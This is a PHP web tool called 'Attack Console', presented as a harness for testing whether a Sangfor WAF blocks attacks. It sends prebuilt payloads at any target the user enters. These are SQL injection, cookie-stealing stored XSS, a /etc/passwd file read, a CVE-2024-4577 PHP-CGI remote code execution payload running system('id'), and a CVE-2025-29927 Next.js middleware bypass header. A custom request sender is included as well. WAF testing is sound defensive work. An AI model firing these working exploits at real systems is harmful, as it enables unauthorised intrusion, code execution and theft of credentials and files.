<?php
// Attack Console — WAF test harness.
// Fires crafted attack requests at a configurable TARGET (IP or DNS) so you can
// test whether a WAF (Sangfor) in front of the target blocks them. Requests are
// sent server-side via cURL, so raw query strings (%AD), arbitrary headers
// (x-middleware-subrequest) and POST bodies can be set — things a browser can't.

function send($method, $url, $headers = [], $body = null) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_CUSTOMREQUEST  => $method,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_FOLLOWLOCATION => false,
    ]);
    if ($body !== null && $body !== '') curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    $resp  = curl_exec($ch);
    $err   = curl_error($ch);
    $code  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $rhead = $resp === false ? '' : substr($resp, 0, $hsize);
    $rbody = $resp === false ? '' : substr($resp, $hsize);
    curl_close($ch);
    return compact('code', 'err', 'rhead', 'rbody', 'method', 'url');
}

$default_target = 'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost');
$target = rtrim($_POST['target'] ?? $default_target, '/');
$attack = $_POST['attack'] ?? '';
$res    = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $target && $attack) {
    switch ($attack) {
        case 'sqli':
            $res = send('POST', "$target/login.php",
                ['Content-Type: application/x-www-form-urlencoded'],
                http_build_query([
                    'username' => $_POST['p_user'] ?? "admin'--",
                    'password' => $_POST['p_pass'] ?? 'x',
                ]));
            break;
        case 'xss':
            $res = send('POST', "$target/comment.php",
                ['Content-Type: application/x-www-form-urlencoded'],
                http_build_query([
                    'author' => $_POST['p_author'] ?? 'attacker',
                    'text'   => $_POST['p_text'] ?? '<script>alert(document.cookie)</script>',
                ]));
            break;
        case 'exfil':
            $f = $_POST['p_file'] ?? '/etc/passwd';
            $res = send('GET', "$target/exfil.php?file=" . rawurlencode($f));
            break;
        case 'cve_4577':
            $qs = $_POST['p_qs'] ?? '%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input';
            $bd = $_POST['p_body'] ?? '<?php system("id"); ?>';
            $res = send('POST', "$target/cve-2024-4577.php?$qs", [], $bd);
            break;
        case 'cve_29927':
            $h = $_POST['p_hdr'] ?? 'middleware:middleware:middleware:middleware:middleware';
            $res = send('GET', "$target/cve-2025-29927.php", ["x-middleware-subrequest: $h"]);
            break;
        case 'custom':
            $method  = strtoupper($_POST['p_method'] ?? 'GET');
            $path    = $_POST['p_path'] ?? '/';
            $headers = array_filter(array_map('trim', explode("\n", $_POST['p_headers'] ?? '')));
            $body    = $_POST['p_cbody'] ?? '';
            $res = send($method, $target . $path, $headers, $body);
            break;
    }
}

function field($name, $val) { return htmlspecialchars($_POST[$name] ?? $val); }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Attack Console (WAF test)</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        h2 { color: #0ff; } h3 { color: #ff0; margin-bottom: 4px; }
        input, textarea, select { background: #333; color: #fff; border: 1px solid #555; padding: 6px; }
        input.wide { width: 100%; max-width: 640px; }
        textarea { width: 100%; max-width: 640px; }
        button { background: #444; color: #0f0; border: 1px solid #0f0; padding: 6px 16px; cursor: pointer; }
        .mod { border: 1px solid #333; padding: 10px 14px; margin: 10px 0; max-width: 680px; }
        .res { border: 1px solid #0ff; padding: 12px; margin: 14px 0; max-width: 680px; }
        .code { font-size: 1.2em; } .ok { color: #4f4; } .blk { color: #f55; }
        pre { background: #000; padding: 10px; overflow: auto; max-height: 320px; color: #ccc; white-space: pre-wrap; }
        label { color: #8f8; } .meta { color: #888; }
    </style>
</head>
<body>
<h2>Attack Console — WAF Capability Test</h2>
<p class="meta">Fires attacks at a target (IP/DNS) via server-side cURL. Place the target behind Sangfor WAF, launch, and read the response: a block page / 403 / connection reset = WAF caught it; a normal exploit response = WAF missed it.</p>

<div class="mod">
    <label>Target base URL (IP or DNS):</label><br>
    <input id="target" class="wide" value="<?= htmlspecialchars($target) ?>" placeholder="http://192.168.1.50 atau http://target.lab">
</div>

<?php if ($res !== null): ?>
<div class="res">
    <div class="code">→ <?= htmlspecialchars($res['method']) ?> <?= htmlspecialchars($res['url']) ?><br>
    HTTP <span class="<?= ($res['code'] >= 200 && $res['code'] < 300) ? 'ok' : 'blk' ?>"><?= (int)$res['code'] ?></span>
    <?php if ($res['err']): ?><span class="blk">(cURL error: <?= htmlspecialchars($res['err']) ?> — possible WAF reset/timeout)</span><?php endif; ?>
    </div>
    <?php if ($res['rhead']): ?><strong>Response headers:</strong><pre><?= htmlspecialchars(substr($res['rhead'], 0, 1500)) ?></pre><?php endif; ?>
    <strong>Response body:</strong><pre><?= htmlspecialchars(substr($res['rbody'], 0, 4000)) ?></pre>
</div>
<?php endif; ?>

<h3>SQL Injection — POST /login.php</h3>
<form class="atk mod" method="POST"><input type="hidden" name="attack" value="sqli"><input type="hidden" name="target" class="tgt">
    username: <input name="p_user" value="<?= field('p_user', "admin'--") ?>">
    password: <input name="p_pass" value="<?= field('p_pass', 'x') ?>">
    <button>Launch</button>
</form>

<h3>Stored XSS — POST /comment.php</h3>
<form class="atk mod" method="POST"><input type="hidden" name="attack" value="xss"><input type="hidden" name="target" class="tgt">
    author: <input name="p_author" value="<?= field('p_author', 'attacker') ?>"><br><br>
    text: <input class="wide" name="p_text" value="<?= field('p_text', '<script>alert(document.cookie)</script>') ?>">
    <br><br><button>Launch</button>
</form>

<h3>Data Exfiltration — GET /exfil.php</h3>
<form class="atk mod" method="POST"><input type="hidden" name="attack" value="exfil"><input type="hidden" name="target" class="tgt">
    file: <input class="wide" name="p_file" value="<?= field('p_file', '/etc/passwd') ?>">
    <br><br><button>Launch</button>
</form>

<h3>CVE-2024-4577 — PHP-CGI RCE (POST)</h3>
<form class="atk mod" method="POST"><input type="hidden" name="attack" value="cve_4577"><input type="hidden" name="target" class="tgt">
    <label>query string:</label><br><input class="wide" name="p_qs" value="<?= field('p_qs', '%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input') ?>"><br><br>
    <label>body (PHP payload):</label><br><input class="wide" name="p_body" value="<?= field('p_body', '<?php system(\"id\"); ?>') ?>"><br><br>
    <button>Launch</button>
</form>

<h3>CVE-2025-29927 — Next.js Middleware Bypass (GET + header)</h3>
<form class="atk mod" method="POST"><input type="hidden" name="attack" value="cve_29927"><input type="hidden" name="target" class="tgt">
    <label>x-middleware-subrequest:</label><br>
    <input class="wide" name="p_hdr" value="<?= field('p_hdr', 'middleware:middleware:middleware:middleware:middleware') ?>"><br><br>
    <button>Launch</button>
</form>

<h3>Custom request (any method / path / headers / body)</h3>
<form class="atk mod" method="POST"><input type="hidden" name="attack" value="custom"><input type="hidden" name="target" class="tgt">
    method:
    <select name="p_method">
        <?php foreach (['GET','POST','PUT','DELETE','HEAD','OPTIONS'] as $m): ?>
        <option <?= (($_POST['p_method'] ?? 'GET') === $m) ? 'selected' : '' ?>><?= $m ?></option>
        <?php endforeach; ?>
    </select>
    path: <input name="p_path" value="<?= field('p_path', '/') ?>" placeholder="/path?x=1">
    <br><br><label>headers (one per line, Name: value):</label><br>
    <textarea name="p_headers" rows="3" placeholder="X-Test: 1"><?= htmlspecialchars($_POST['p_headers'] ?? '') ?></textarea><br><br>
    <label>body:</label><br><textarea name="p_cbody" rows="3" placeholder="raw body"><?= htmlspecialchars($_POST['p_cbody'] ?? '') ?></textarea>
    <br><br><button>Launch</button>
</form>

<script>
document.querySelectorAll('form.atk').forEach(function (f) {
    f.addEventListener('submit', function () {
        f.querySelector('.tgt').value = document.getElementById('target').value;
    });
});
</script>
</body>
</html>
